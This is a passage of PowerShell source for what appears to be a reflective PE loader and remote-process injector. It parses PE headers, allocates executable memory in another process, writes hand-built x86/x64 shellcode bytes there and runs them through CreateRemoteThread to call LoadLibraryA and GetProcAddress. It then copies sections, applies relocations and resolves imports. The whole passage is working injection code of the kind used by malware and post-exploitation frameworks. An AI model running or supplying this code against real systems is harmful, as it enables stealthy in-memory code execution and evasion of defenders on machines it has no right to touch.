			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}

		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}

		return $PEInfo
	}


	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,

		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)

		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}

		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA")

		[IntPtr]$DllAddress = [IntPtr]::Zero


		if ($PEInfo.PE64Bit -eq $true)
		{

			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}



			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)

			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem

			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)


			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}

			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}

			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}


			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}

			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}

			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}

		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

		return $DllAddress
	}


	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,

		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,

		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero

        if (-not $LoadByOrdinal)
        {
        	$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)


		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
        }

        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }


		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress")



		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}




		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem

		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)

		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}

		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}


		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])


		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }

		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)

		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)


			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))





			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}

			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}

			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}


			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,

		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)

		[Int64]$BaseDifference = 0
		$AddDifference = $true
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)


		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}


		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{

			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2


			for($i = 0; $i -lt $NumRelocations; $i++)
			{

				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])


				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}




				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{

					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])

					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{

					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}

			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,

		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,

		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)

		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}

		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)


				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)

				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}


				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics)
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero



					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff
                        $LoadByOrdinal = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff
                        $LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}

					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
					}
					else
					{
				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}

					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)

					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])



                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
				}

				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)

		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}

		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}

		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,

		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)

		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
